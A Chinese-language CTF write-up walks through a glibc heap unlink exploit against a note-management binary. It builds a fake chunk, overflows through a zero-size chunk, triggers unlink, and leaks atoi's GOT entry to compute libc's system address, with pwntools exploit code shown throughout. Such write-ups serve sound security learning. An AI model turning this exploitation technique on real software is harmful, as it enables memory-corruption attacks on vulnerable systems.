[程序](https://github.com/doom-man/ctf/tree/master/2015-hacklu-bookstore)

又是涨新知识的一题。
先检查程序的防护。
![image](B5D5252723E243A49162266744D10846)

#### 执行程序 + 静态分析

1. 输入name , address  
2. 1. new note 记录size 和 堆指针
2. 2. show note
2. 3. edit note 覆盖已有note，并在note后面添加内容
2. 4. free note


![image](EB322A7382E1419CB650BDA00B12A5DD)

![image](EED2EAE9062241A08E23D64362F3843A)
![image](AE027BB90D7141D7BAE4180B9528823A)

chunk1 虽然申请的大小为 0，但是 glibc 的要求 chunk 块至少可以存储 4 个必要的字段 (prev_size,size,fd,bk)，所以会分配 0x20 的空间。

#### 生成3个note
构造3个chunk, chunk0 chunk1 chunk2
```
# chunk0: a fake chunk
ptr = 0x0000000000602120
fakefd = ptr - 0x18
fakebk = ptr - 0x10
content = 'a' * 8 + p64(0x61) + p64(fakefd) + p64(fakebk) + 'b' * 64 + p64(0x60)
#content = p64(fakefd) + p64(fakebk)
newnote(128, content)
# chunk1: a zero size chunk produce overwrite
newnote(0, 'a' * 8)
# chunk2: a chunk to be overwrited and freed
newnote(0x80, 'b' * 16)
```
![image](58E9A8EF307A4455BC0306F2FB127BB0)

当构造完三个 note 后，堆的基本构造如图 1 所示。

![image](E60592DF75B74BD29D62117E56E1119B)

#### 释放 chunk1 - 覆盖 chunk2 - 释放 chunk2

```
# edit the chunk1 to overwrite the chunk2
deletenote(1)
content = 'a' * 16 + p64(0xa0) + p64(0x90)
newnote(0, content)
# delete note 2 to trigger the unlink
# after unlink, ptr[0] = ptr - 0x18
deletenote(2)
```
首先释放 chunk1，由于该 chunk 属于 fastbin，所以下次在申请的时候仍然会申请到该 chunk（因为edit note 函数里面
![image](EB58D1F1067D4E209612E8318E889553) 并没有存在溢出
），同时由于上面所说的类型问题，我们可以读取任意字符，所以就可以覆盖 chunk2，覆盖之后如图 2 所示。
![image](C6B21A7CA8554AA397D677B7CC23431E)

该覆盖主要是为了释放 chunk2 的时候可以后向合并（合并低地址），对 chunk0 中虚拟构造的 chunk 进行 unlink。即将要执行的操作为 unlink(ptr[0])，同时我们所构造的 fakebk 和 fakefd 满足如下约束


    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                      \
unlink 成功执行，会导致 ptr[0] 所存储的地址变为 fakebk，即 ptr-0x18。

而系统仍然认为ptr[0] 指向堆区 ，
```
atoi_got = note2.got['atoi']
content = 'a' * 0x18 + p64(atoi_got)
editnote(0, 1, content)
#将地址指向atoi
shownote()
#获取地址
sh.recvuntil('is ')
atoi_addr = sh.recvuntil('\n', drop=True)
print atoi_addr
atoi_addr = u64(atoi_addr.ljust(8, '\x00'))
print 'leak atoi addr: ' + hex(atoi_addr)

# get system addr 通过偏移得到system 地址
atoi_offest = libc.symbols['atoi']
libcbase = atoi_addr - atoi_offest
system_offest = libc.symbols['system']
system_addr = libcbase + system_offest

print 'leak system addr: ', hex(system_addr)

```

https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unlink-zh/

